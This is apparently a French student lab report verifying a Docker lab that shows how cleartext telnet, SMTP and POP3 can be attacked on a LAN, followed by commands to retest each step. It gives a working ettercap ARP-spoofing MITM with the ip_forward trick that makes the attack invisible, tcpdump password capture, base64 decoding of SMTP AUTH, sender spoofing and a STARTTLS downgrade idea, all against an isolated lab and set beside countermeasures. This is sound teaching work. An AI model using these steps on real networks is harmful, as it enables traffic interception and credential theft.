# TP1 — Rapport de vérification

Sujet 1 : *Démonstration des faiblesses des protocoles sans protection dans un
réseau local*. Vérification de la couverture des 7 points de l'énoncé, faite en
exécutant réellement chaque test sur le lab.

## Couverture de l'énoncé

| § | Énoncé | État | Vérifié par |
|---|---|---|---|
| 1 | Préliminaires : 4 machines, plan d'adressage, ping | **OK** | ping croisé 3 machines, 6/6 |
| 2 | Serveur TELNET (in.telnetd, superdaemon, netstat) | **OK** | shell distant obtenu, `tptelnet@serveur` |
| 3 | Mail : SMTP + POP, envoi et relecture en telnet | **OK** | chaîne complète, `RETR 1` rend le message |
| 4 | Désactiver un serveur, changer les ports | **OK** | 3 services sur 2323/2525/1110, POP3 désactivable |
| 5 | Network scanner (nmap) | **Partiel** | nmap OK ; b/c/e/f nécessitent l'autre binôme |
| 6 | ARP : tables, proxy ARP, ettercap | **OK** | `arp -n`/`arp -d`, proxy_arp=1, ettercap 0.8.3.1 |
| 7 | ARP spoofing, MITM, capture, tableau | **OK** | 0 paquet avant → 42 après, `PASS alice` en clair |

**§1** : l'énoncé prévoit 4 machines dont « la quatrième ne s'utilise pas ». Le lab
en a donc 3 : serveur `10.99.0.10`, client `10.99.0.20`, attaquant `10.99.0.30`.
Le switch ethernet est remplacé par un bridge Docker, qui a le même comportement
de commutation — c'est ce qui rend le §7 démontrable.

**§5** : les points b, c, e et f demandent de scanner *le sous-réseau de l'autre
groupe*. Infaisable seul, à faire en séance. Ce qui est vérifiable l'est : `nmap`
est installé sur la machine client comme demandé, et il retrouve les trois
services avec leurs versions.

## Écarts trouvés pendant la vérification, et corrigés

| Problème | Cause | Correctif |
|---|---|---|
| POP3 `Connection refused`, logs vides, conteneur `Up` | `exim4 -bd` ne se détache pas quand son père est le PID 1 → entrypoint bloqué, Dovecot jamais lancé | `exim4 -bdf ... &` |
| ettercap s'arrête : `ERROR : 30, Read-only file system` | `/proc/sys` monté en lecture seule, ettercap écrit dans `net/ipv6/conf/all/forwarding` | `privileged: true` sur l'attaquant |
| proxy_arp non activable (§6.d) | même cause | idem |
| L'attaque coupe le trafic au lieu de l'espionner | ettercap remet `ip_forward` à 0 pour relayer en userspace, ce relais ne marche pas ici : SYN interceptés, jamais transmis | forcer `ip_forward=1` **après** le lancement d'ettercap |
| `nmap` absent de la machine client (§5.a) | non installé | ajouté à `client/Dockerfile` |
| Pas de moyen de désactiver un serveur (§4.a) | non prévu | `ENABLE_SMTP` / `ENABLE_POP3` / `ENABLE_TELNET` |

Les trois derniers points du milieu sont les plus intéressants pour le compte
rendu : **une attaque MITM mal réglée est un déni de service**, pas une écoute.
Sans le `ip_forward=1`, le client ne se connecte plus du tout et l'attaque se
voit immédiatement. Avec, la session passe normalement et personne ne remarque
rien — c'est exactement ce qui fait la dangerosité de l'attaque.

## Résultats mesurés

```
§1  ping           client/attaquant/serveur : 6/6 OK
§2  telnet 23      login tptelnet -> uid=1002(tptelnet), shell obtenu
§3  SMTP 25        250 OK id=1x3YKD-00006H-2K
    POP3 110       +OK 1 538 / RETR rend le message complet
§4  ports          2323 (inetd), 2525 (exim4), 1110 (dovecot) : LISTEN
    ENABLE_POP3=0  port 110 absent, conteneur toujours healthy
§5  nmap 7.93      23/tcp telnet | 25/tcp Exim smtpd 4.96 | 110/tcp Dovecot pop3d
§6  arp -d         ligne supprimée puis reformée seule au ping suivant
    proxy_arp      activable (= 1)
§7  avant attaque  0 paquet vu par l'attaquant
    pendant        42 paquets, "PASS alice" lisible en clair
    après arrêt    table ARP restaurée avec la vraie MAC
```

## Réponses aux questions posées dans l'énoncé

**§7.a — « Quels paquets voyez-vous et pourquoi ? »**
Avant l'attaque, l'attaquant ne voit que le broadcast (ARP, DHCP) et ce qui lui
est adressé. Zéro paquet de la session client↔serveur. Le bridge apprend les MAC
et ne recopie la trame que sur le port du destinataire : c'est un commutateur, pas
un concentrateur. **Piège** : capturer depuis l'hôte sur l'interface `br-xxxx`
montre tout sans aucune attaque, et la démonstration ne prouve alors rien.

**§7.b — « Quelle est la topologie logique souhaitée ? À qui faire croire quoi ? »**
On veut passer d'un lien direct client↔serveur à un chemin client→attaquant→serveur.
Il faut faire croire **au client** que l'IP du serveur a la MAC de l'attaquant, et
**au serveur** que l'IP du client a la MAC de l'attaquant. Les deux sens sont
nécessaires, sinon on ne voit qu'une moitié de la conversation. Ce qu'il faut
activer sur l'attaquant : le **routage IP** (`ip_forward=1`), sinon les paquets
sont interceptés puis jetés.

**§7.d — « Que signifient les options d'ettercap ? »**
`ettercap -o -T -P repoison_arp -M arp:remote /X// /Y//`
`-T` interface texte, `-o` mode « only sniff » (ettercap ne s'annonce pas sur le
réseau), `-P repoison_arp` recharge le plugin d'empoisonnement périodiquement pour
que les tables ne reviennent pas à la normale, `-M arp:remote` monte l'attaque MITM
par ARP en incluant le trafic sortant du réseau, `/X//` et `/Y//` sont les deux
cibles au format `MAC/IP/PORT` — ne renseigner que l'IP.

**§7.e — « Sous quelle forme apparaît le login ? »**
Trois formes différentes, c'est la question à points :

| Protocole | Forme dans la capture |
|---|---|
| TELNET (23) | **caractère par caractère**, un paquet par touche, avec l'écho serveur. Le login n'apparaît jamais d'un bloc → *Follow TCP Stream* obligatoire |
| POP3 (110) | `USER alice` / `PASS alice` en **ASCII brut**, lisibles directement dans le flux |
| SMTP (25, `AUTH LOGIN`) | **base64**. `echo dGVzdA== \| base64 -d` suffit. C'est un **encodage**, pas un chiffrement — écrire « chiffré » fait perdre le point |

**§7.f — Tableau des faiblesses**

| Faiblesse | Où elle se voit | Conséquence | Contre-mesure |
|---|---|---|---|
| Session TELNET en clair | tout le flux du 23 | shell complet repris | SSH (22) |
| Identifiants POP3 en clair | `USER`/`PASS` | compte repris tel quel | POP3S 995, ou `STLS` + `disable_plaintext_auth = yes` |
| **Base d'utilisateurs commune** | `/etc/passwd`, `/etc/shadow` | **un mot de passe capturé en POP3 ouvre le shell TELNET** | comptes de service séparés, 2FA |
| Contenu SMTP en clair | phase `DATA` | lecture du courrier et des destinataires | STARTTLS, chiffrement de bout en bout |
| Enveloppe non authentifiée | `MAIL FROM` sans contrôle | usurpation d'expéditeur en 3 lignes | SPF, DKIM, DMARC, SMTP AUTH |
| `AUTH LOGIN` en base64 | authentification SMTP | décodage immédiat | exiger TLS avant `AUTH` |
| ARP sans authentification | tables empoisonnées en 8 s | homme au milieu sur tout le LAN | ARP statique, DAI sur le switch, 802.1X |
| Identité du serveur non vérifiée | côté client | MITM transparent | TLS avec validation du certificat |
| Relais trop large | `dc_relay_nets` | relais ouvert | restreindre au `/24` |

**STARTTLS** : exim l'annonce (`250-STARTTLS`) mais une session telnet enchaîne
directement sur `MAIL FROM` et tout part en clair. Un MITM peut retirer la ligne
`250-STARTTLS` de la réponse pour forcer le client à rester en clair : c'est
l'**attaque par déclassement**, et c'est pourquoi les ports 465 et 995 existent.

---

# Commandes pour tout retester

## 0. Démarrer

```bash
docker compose build
docker compose up -d
docker compose ps          # tp1-serveur doit etre (healthy)
```

`healthy` signifie que les trois ports écoutent réellement. Un conteneur `Up`
ne prouve rien.

## 1. Préliminaires — ping

```bash
docker compose exec client    ping -c2 10.99.0.10
docker compose exec attaquant ping -c2 10.99.0.10
docker compose exec serveur   ping -c2 10.99.0.20
```

## 2. TELNET

```bash
docker compose exec serveur netstat -antp | grep ':23'    # inetd LISTEN
docker compose exec client telnet 10.99.0.10
# login: tptelnet  /  password: tptelnet123
# puis : whoami ; hostname ; id ; exit
```

Montrer aussi le mécanisme du superdaemon :

```bash
docker compose exec serveur grep telnet /etc/inetd.conf   # ligne active
docker compose exec serveur grep '^telnet' /etc/services  # 23/tcp
```

## 3. Mail

Automatique :

```bash
docker compose exec client bash /tests/test-mail.sh
```

À la main (§3.e puis §3.f) :

```bash
docker compose exec client telnet 10.99.0.10 25
```
```
EHLO client.tp.local
MAIL FROM:<bob@mail.tp.local>
RCPT TO:<alice@mail.tp.local>
DATA
Subject: test TP1
From: bob@mail.tp.local
To: alice@mail.tp.local

Corps du message.
.
QUIT
```
```bash
docker compose exec serveur cat /var/mail/alice
docker compose exec serveur tail /var/log/exim4/mainlog
docker compose exec client telnet 10.99.0.10 110
```
```
USER alice
PASS alice
STAT
LIST
RETR 1
DELE 1
QUIT
```

**Démontrer l'usurpation** (§7.f, ligne « enveloppe non authentifiée ») : refaire
le même dialogue avec `MAIL FROM:<directeur@uvsq.fr>`, le serveur accepte sans
broncher.

## 4. Changer la configuration

Dans `docker-compose.yml`, service `serveur` :

```yaml
    environment:
      SMTP_PORT: "2525"
      POP3_PORT: "1110"
      TELNET_PORT: "2323"
      ENABLE_POP3: "0"      # 4.a : desactiver un des trois serveurs
```

```bash
docker compose up -d --force-recreate serveur
docker compose exec serveur netstat -antp | grep -E '2525|1110|2323'
docker compose exec client telnet 10.99.0.10 2323
docker compose logs serveur | head -8      # la banniere annonce DESACTIVE
```

Remettre `"25"`, `"110"`, `"23"`, `"1"` ensuite.

## 5. nmap

```bash
docker compose exec client nmap -sV -p- 10.99.0.10        # trouve les 3 services
docker compose exec client nmap -sn 10.99.0.0/24          # machines actives
docker compose exec client nmap -sS -T2 10.99.0.10        # scan furtif
```

Refaire le premier après avoir changé les ports : nmap retrouve tout par les
bannières. **Déplacer un port ne protège rien.**

## 6 et 7. ARP, spoofing, capture

Démonstration complète en une commande :

```bash
bash tests/test-attaque.sh
```

À la main, si l'enseignant veut voir les étapes :

```bash
# 6.b : lire et manipuler la table ARP
docker compose exec client arp -n
docker compose exec client arp -d 10.99.0.10
docker compose exec client arp -n

# 6.d : proxy ARP
docker compose exec attaquant sh -c 'echo 1 > /proc/sys/net/ipv4/conf/eth0/proxy_arp'

# 7.a : capture AVANT (dans un terminal)
docker compose exec attaquant tcpdump -i eth0 -n -A 'tcp port 23 or tcp port 25 or tcp port 110'
# dans un autre terminal, faire une session POP3 depuis le client
# -> l'attaquant ne voit rien

# 7.d : l'attaque
docker compose exec attaquant ettercap -T -q -i eth0 -M arp:remote /10.99.0.20// /10.99.0.10//
```

**Ligne indispensable, dans un troisième terminal, juste après ettercap :**

```bash
docker compose exec attaquant sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
```

Sans elle, ettercap intercepte mais ne réachemine pas : le client ne se connecte
plus du tout. L'attaque devient un déni de service au lieu d'une écoute, et elle
est immédiatement visible.

```bash
# verifier l'empoisonnement
docker compose exec client  arp -n     # 10.99.0.10 a la MAC de l'attaquant
docker compose exec serveur arp -n     # 10.99.0.20 aussi

# 7.e : capture PENDANT, puis relancer une session POP3 ou telnet
docker compose exec attaquant tcpdump -i eth0 -n -A 'tcp port 110' -w /tmp/apres.pcap
docker compose cp attaquant:/tmp/apres.pcap .     # ouvrir dans Wireshark
```

Dans Wireshark : clic droit sur un paquet → **Follow → TCP Stream**. Le mot de
passe POP3 apparaît en clair. Faire de même sur le port 23 pour montrer la forme
caractère par caractère du login telnet.

## Diagnostic si quelque chose ne répond pas

```bash
bash tests/diag.sh
```

Il donne l'état des conteneurs, les ports en écoute, les processus, la config
Dovecot, et surtout **où en est l'entrypoint** — c'est ce dernier point qui avait
révélé le blocage d'`exim4 -bd`.

---

## Fichiers du dépôt

```
.env                       plan d'adressage, seul endroit a modifier
docker-compose.yml         reseau, 3 conteneurs, ports et ENABLE_* par variables
Readme.md                  notes techniques et depannage
rapport-partie-telnet.md   compte rendu §2
rapport-partie-mail.md     compte rendu §3, §4, §7
RAPPORT-FINAL.md           ce fichier : verification et commandes de test
serveur/                   exim4 + dovecot + inetd/telnetd, comptes alice/bob/tptelnet
client/                    telnet, nc, nmap, arping
attaquant/                 nmap, tcpdump, tshark, ettercap  (privileged)
tests/test-mail.sh         chaine SMTP -> POP3
tests/test-attaque.sh      §6 et §7 : ARP, spoofing, capture avant/apres
tests/diag.sh              diagnostic complet
```
